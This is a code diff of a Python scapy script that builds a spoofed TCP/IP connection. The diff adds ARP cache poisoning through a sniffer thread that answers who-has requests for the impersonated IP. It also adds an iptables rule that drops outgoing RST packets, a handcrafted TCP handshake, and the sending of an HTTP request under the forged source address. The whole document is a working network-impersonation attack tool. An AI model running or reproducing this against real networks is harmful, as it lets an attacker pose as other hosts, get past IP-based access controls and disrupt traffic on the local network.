@@ -1,4 +1,5 @@
 from scapy.all import *
+import thread
 
 
 class SpoofedTCPIPConnection(object):
@@ -8,35 +9,70 @@ class SpoofedTCPIPConnection(object):
         self.src_port = src_port
         self.src_ip = src_ip
         self._seq_num = random.randint(1, 65535)
+        self._ack = 0
+        self._ip = IP(src=self.src_ip, dst=self.dst_ip)
 
     def connect(self):
-        self._configure_OS()
-        self._poison_arp()
+        self._configure_iptables()
+        self.arp_thread_id = thread.start_new_thread(self._poison_arp, ())
         self._handshake()
 
-    def _handshake(self):
-        syn_pckt = IP(src=self.src_ip, dst=self.dst_ip) / TCP(sport=self.src_port, dport=self.dst_port, flags='S',
-                                                              seq=self._seq_num)
-        synack = sr(syn_pckt, timeout=1)
-
     def close(self):
-        self._clear_OS_config()
+        self._clear_OS_iptables()
 
-    def _configure_OS(self):
+    def send_data(self, data):
+        pckt = self._ip / TCP(sport=self.src_port, dport=self.dst_port,
+                              seq=self._seq_num, ack=self._ack, flags='A') / data
+        self._seq_num += len(data)
+        response = sr1(pckt)
+        self._ack = response[TCP].seq + 1
+
+        print response.show()
+
+    def _handshake(self):
+        syn_pckt = self._ip / TCP(sport=self.src_port, dport=self.dst_port, flags='S',
+                                  seq=self._seq_num)
+        synack = sr1(syn_pckt)
+        tmp1 = synack.ack
+        tmp2 = synack.seq
+        self._seq_num += 1
+
+        if TCP in synack and synack[TCP].flags & (2 | 16):
+            print "RCVED SYNACK"
+            self._ack = synack[TCP].seq + 1
+            ack_pckt = self._ip / TCP(sport=self.src_port, dport=self.dst_port, flags='A',
+                                      seq=tmp1, ack=tmp2+1)
+            send(ack_pckt)
+
+
+        else:
+            raise RuntimeError("SYNACK invalid")
+
+    def _configure_iptables(self):
         """
         add a rule to drop outgoing RST tcp packets
         """
         os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
 
-    def _clear_OS_config(self):
+    def _clear_OS_iptables(self):
         os.system('iptables --flush OUTPUT')
 
     def _poison_arp(self):
-        pass
 
-    def _send_arp_response(self):
-        arp_pckt = ARP(hwdst='ff:ff:ff:ff:ff:ff', op=ARP.is_at, psrc=self.src_ip, pdst='192.168.1.2')
+        def arp_callback(packet):
+            # print packet.show()
+
+            if ARP in packet and packet.op == ARP.who_has and packet.pdst == self.src_ip:
+                self._send_arp_response(packet.psrc)
+
+        sniff(prn=arp_callback, filter='arp')
+
+    def _send_arp_response(self, dest_ip):
+        arp_pckt = ARP(hwdst='ff:ff:ff:ff:ff:ff', op=ARP.is_at, psrc=self.src_ip, pdst=dest_ip)
         send(arp_pckt)
+
+    def maintain(self):
+        pass
 
 
 if __name__ == '__main__':
@@ -46,10 +82,8 @@ if __name__ == '__main__':
     dst_port = 8080
 
     c = SpoofedTCPIPConnection(src_ip, src_port, dst_ip, dst_port)
-    try:
-        c._send_arp_response()
-        # c.connect()
-    except:
-        pass
 
+    c.connect()
+    c.maintain()
+    c.send_data('GET / HTTP/1.0\r\n\r\n')
     c.close()
